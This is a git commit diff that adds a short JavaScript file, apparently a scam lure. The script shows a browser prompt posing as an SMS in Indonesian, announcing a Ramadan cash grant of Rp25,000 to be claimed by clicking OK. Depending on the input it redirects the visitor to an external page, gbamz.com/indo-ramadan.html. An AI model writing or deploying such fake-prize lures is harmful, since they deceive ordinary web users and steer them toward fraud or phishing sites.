05f75f6cfba09b560960b407a98e2ca05b27ec92
sweet16palz-hub <sweet16palz@gmail.com>
2026-02-15 17:24:42 +0100

    Create indo-active.js

---
+++ indo-active.js
@@ -0,0 +1,5 @@
+var password = 'PENARIKAN Rp25.000'
+password=prompt('SMS: Selamat, Anda berhak menerima Hibah Tunai Ramadhan Rp25.000, klik OK untuk mengklaim hadiah uang tunai Anda','PENARIKAN Rp25.000');
+if (password != 'PENARIKAN Rp25.000') {
+location.href='https://gbamz.com/indo-ramadan.html';
+}
